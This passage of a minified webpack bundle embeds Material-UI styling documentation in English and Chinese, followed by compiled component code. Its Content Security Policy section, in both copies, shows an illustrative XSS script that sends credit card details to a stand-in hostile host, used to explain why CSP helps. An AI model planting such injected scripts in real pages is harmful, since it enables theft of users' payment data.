that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser. It's one of the key elements to know when overriding styles. We **encourage** you to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // 🔵\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // 🔴\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red 🔴 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML comment\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### Other HTML element\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it’s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/styles/api/#serverstylesheets) API documentation.\n\n### Gatsby\n\nWe have [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Default\n\nBy default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* … */ },\n  label: { /* … */ },\n  outlined: {\n    /* … */\n    '&$disabled': { /* … */ },\n  },\n  outlinedPrimary: {\n    /* … */\n    '&:hover': { /* … */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* … */ }\n.MuiButton-label { /* … */ }\n.MuiButton-outlined { /* … */ }\n.MuiButton-outlined.Mui-disabled { /* … */ }\n.MuiButton-outlinedPrimary: { /* … */ }\n.MuiButton-outlinedPrimary:hover { /* … */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; 💚\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; 💔\n    }\n    &:hover fieldset {\n      border-color: yellow; 💛\n    }\n    &.Mui-focused fieldset {\n      border-color: green; 💚\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Global CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## Content Security Policy (CSP)\n\n### What is CSP and why is it useful?\n\nBasically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nThis vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### How does one implement CSP?\n\nIn order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.\n\nA CSP nonce is a Base 64 encoded string. You can generate one like this:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nThen, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client-side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.\n\n```jsx\n<meta property=\"csp-nonce\" content={nonce} />\n```"},"7GMC":function(e,n){e.exports="# 高级\n\n<p class=\"description\">本节包含了更多 @material-ui/styles 的进阶用法。</p>\n\n## 主题\n\n添加` ThemeProvider `到应用程序的顶层，将主题传递到React组件树。 然后，您可以在样式函数中访问主题对象。\n\n```jsx\nimport { ThemeProvider } from '@material-ui/styles';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### 访问组件中的主题\n\n在组件中访问 @material-ui/styles 主题。\n\n#### `useTheme` hook\n\n```jsx\nimport { useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n```jsx\nimport { withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### 主题嵌套\n\n您可以嵌套多个主题提供者。 在应用程序的不同区域需要应用不同外观时，这非常有用。\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\n内部主题将 **覆盖** 外部主题。 您可以通过提供一个函数来扩展外部主题：\n\n```jsx\n<ThemeProvider theme={…} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\n` makeStyles ` (hook generator) 和` withStyles ` (HOC) API允许为每个样式表创建多个样式规则。 每个样式规则都有自己的类名。 类名通过` classes `变量传入组件。 在为组件中的嵌套元素设置样式时，这尤其有用。\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\n但是，类名通常是不确定的。 父组件如何覆盖嵌套元素的样式？\n\n### withStyles\n\n这是最简单的情况。 包装组件接受` classes ` 属性， 它简单地合并了样式表提供的类名。\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### makeStyles\n\nHook API需要多写一点模版代码。 您需要转发父级组件的属性到hook作为第一个参数。\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS使用插件来扩展其核心，允许您挑选所需的功能， 并且只为您正在使用的内容支付性能开销。\n\n默认情况下，Material-UI不会启用所有插件。 以下（它是 [ jss-preset-default的子集](https://cssinjs.org/jss-preset-default/) ） 被包含在内：\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\n当然，你可以自由的添加新插件。 我们有一个[](https://github.com/alitaheri/jss-rtl)jss-rtl插件的例子。\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nfunction App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n\nexport default App;\n```\n\n## 字符串模板\n\n如果您更喜欢CSS语法而不是JSS，则可以使用[ jss-plugin-template ](https://cssinjs.org/jss-plugin-template/)插入。\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\n请注意，这不支持选择器或嵌套规则。\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS 注入顺序\n\n> 了解浏览器如何计算CSS特异性**非常重要**。 这是重写样式时要知道的关键元素之一。 我们 **推荐**您要阅读此MDN资料：[如何计算特异性？ ](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\n默认情况下，注入的style标签会被插入到页面`<head>`元素的最后。 它们比页面上任何其他样式标签更具特异性，例如CSS模块， styled components。\n\n### injectFirst\n\n`StylesProvider`组件的属性 `injectFirst` 会把style标签注入到head的**前部**(意味着更低的权重)。\n\n```jsx\nimport { StylesProvider } from '@material-ui/styles';\n\n<StylesProvider injectFirst>\n  {/* 你的组件树。\n      样式化组件可以覆盖 Material-UI 的样式。 */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\n使用 `makeStyles` / `withStyles` / `styled` 的注入顺序于调用顺序**相同**。 例如，在这种情况下，红色胜出：\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // 🔵\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // 🔴\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red 🔴 wins.\n  return <div className={className} />;\n}\n```\n\nHook 调用顺序和类名顺序**不影响**注入属性权重 。\n\n### insertionPoint\n\nJSS [提供了一种机制](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point)控制这种情况。 通过添加`insertionPoint`到HTML中，你可以[控制](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order)组件中CSS的插入位置。\n\n#### HTML 注释\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### 其他 HTML 元素\n\n创建生产环境时, [Create React App](https://github.com/facebook/create-react-app) 会剥离 HTML 注释。 To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n## 服务器端呈现\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it’s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/styles/api/#serverstylesheets) API documentation.\n\n### Gatsby\n\nWe have [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### 默认值\n\nBy default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* … */ },\n  label: { /* … */ },\n  outlined: {\n    /* … */\n    '&$disabled': { /* … */ },\n  },\n  outlinedPrimary: {\n    /* … */\n    '&:hover': { /* … */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* … */ }\n.MuiButton-label { /* … */ }\n.MuiButton-outlined { /* … */ }\n.MuiButton-outlined.Mui-disabled { /* … */ }\n.MuiButton-outlinedPrimary: { /* … */ }\n.MuiButton-outlinedPrimary:hover { /* … */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; 💚\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; 💔\n    }\n    &:hover fieldset {\n      border-color: yellow; 💛\n    }\n    &.Mui-focused fieldset {\n      border-color: green; 💚\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## 全局CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## 内容安全政策（CSP）\n\n### 什么是CSP，为什么它有用？\n\n基本上，CSP通过要求开发人员将其资产从中检索的源列入白名单来缓解跨站点脚本（XSS）攻击。 此列表作为服务器的标头返回。 例如，假设您有一个托管在` https://example.com`的网站 CSP头`default-src：'self';`将允许位于`https://example.com/*`的所有资产并否认所有其他人。 如果您的网站的某个部分容易受到XSS的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\n此漏洞允许攻击者执行任何操作。 但是，使用安全的CSP标头，浏览器将不会加载此脚本。\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### 如何实现CSP？\n\n为了将CSP与Material-UI（和JSS）一起使用，您需要使用nonce。 A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS有[一个很棒的教程](https://github.com/cssinjs/jss/blob/master/docs/csp.md)关于如何使用Express和React Helmet实现这一目标。 对于基本纲要，请继续阅读。\n\nCSP nonce是Base 64编码的字符串。 你可以这样生成一个：\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. 然后，将此随机数应用于CSP标头。 应用了随机数时，CSP标头可能如下所示：\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\n然后，您必须将此随机数传递给JSS，以便将其添加到后续`<style>`标记中。 The client-side gets the nonce from a header. 无论是否使用SSR，都必须包含此标头。\n\n```jsx\n<meta property=\"csp-nonce\" content={nonce} />\n```"},"7HKs":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return c});var s=t("mXGw"),r=t.n(s),o=t("3O2h"),a=t("h7Hf"),i=Object(o.a)(function(e){return{root:{background:e.background,border:0,fontSize:16,borderRadius:3,boxShadow:"0 3px 5px 2px rgba(255, 105, 135, .3)",color:"white",height:48,padding:"0 30px"}}});var l=r.a.createElement(a.a,{theme:{background:"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)"}},r.a.createElement(function(){var e=i();return r.a.createElement("button",{type:"button",className:e.root},"Theming")},null));function c(){return l}},"7RiP":function(e,n,t){"use strict";var s=t("z3IF"),r=t("2Fjn"),o=t("Rbzu"),a=t("mXGw"),i=t.n(a),l=t("PDtE"),c=t("ADfD"),d=t("Hg0Q"),u=t("XpU0"),m=i.a.forwardRef(function(e,n){var t=e.children,o=e.classes,a=e.className,u=e.component,m=void 0===u?"label":u,p=(e.disabled,e.error,e.filled,e.focused,e.required,Object(r.a)(e,["children","classes","className","component","disabled","error","filled","focused","required"])),h=Object(d.a)(),f=Object(c.a)({props:e,muiFormControl:h,states:["required","focused","disabled","error","filled"]});return i.a.createElement(m,Object(s.default)({className:Object(l.a)(o.root,a,f.disabled&&o.disabled,f.error&&o.error,f.filled&&o.filled,f.focused&&o.focused,f.required&&o.required),ref:n},p),t,f.required&&i.a.createElement("span",{className:Object(l.a)(o.asterisk,f.error&&o.error)}," ","*"))});n.a=Object(u.default)(function(e){return{root:Object(o.a)({color:e.palette.text.secondary},e.typography.body1,{lineHeight:1,padding:0,"&$focused":{color:e.palette.primary["light"===e.palette.type?"dark":"light"]},"&$disabled":{color:e.palette.text.disabled},"&$error":{color:e.palette.error.main}}),focused:{},disabled:{},error:{},filled:{},required:{},asterisk:{"&$error":{color:e.palette.error.main}}}},{name:"MuiFormLabel"})(m)},"81nG":function(e,n,t){e.exports=t("xLO/")},"9SVr":function(e,n,t){"use strict";t.r(n);var s=t("mXGw"),r=t.n(s),o=t("005G"),a=t("h7Hf");var i=Object(o.a)(function(e){return r.a.createElement("span",null,"spacing ".concat(e.theme.spacing))}),l=r.a.createElement(i,null);n.default=function(){return r.a.createElement(a.a,{theme:{spacing:"8px"}},l)}},AMAy:function(e,n,t){"use strict";function s(e){return e}t.d(n,"a",function(){return s})},BCuL:function(e,n){e.exports="import React from 'react';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStyles = makeStyles({\n  '@global': {\n    '.cssjss-advanced-global-root': {\n      height: 100,\n      width: 100,\n      backgroundColor: 'blue',\n    },\n    '.cssjss-advanced-global-child': {\n      height: 8,\n      backgroundColor: 'red',\n    },\n  },\n});\n\nexport default function GlobalCss() {\n  useStyles();\n\n  return (\n    <div className=\"cssjss-advanced-global-root\">\n      <div className=\"cssjss-advanced-global-child\" />\n    </div>\n  );\n}\n"},CH4Z:function(e,n,t){"use strict";var s=t("Rbzu"),r=t("2Fjn"),o=t("mXGw"),a=t.n(o),i=t("AO+R"),l=t("z3IF"),c=t("0tNF"),d=t("s20r"),u=t.n(d),m=t("PDtE"),p=(t("FIWN"),t("DmyM")),h=t("imrm"),f=t("c1Jj");function g(e,n){return"object"==typeof n&&null!==n?e===n:String(e)===String(n)}var y=a.a.forwardRef(function(e,n){var t=e.autoFocus,o=e.autoWidth,i=e.children,d=e.classes,y=e.className,b=e.disabled,v=e.displayEmpty,S=e.IconComponent,j=e.inputRef,w=e.MenuProps,x=void 0===w?{}:w,P=e.multiple,T=e.name,C=e.onBlur,k=e.onChange,N=e.onClose,O=e.onFocus,M=e.onOpen,A=e.open,I=e.readOnly,D=e.renderValue,E=(e.required,e.SelectDisplayProps),R=e.tabIndex,B=e.type,F=void 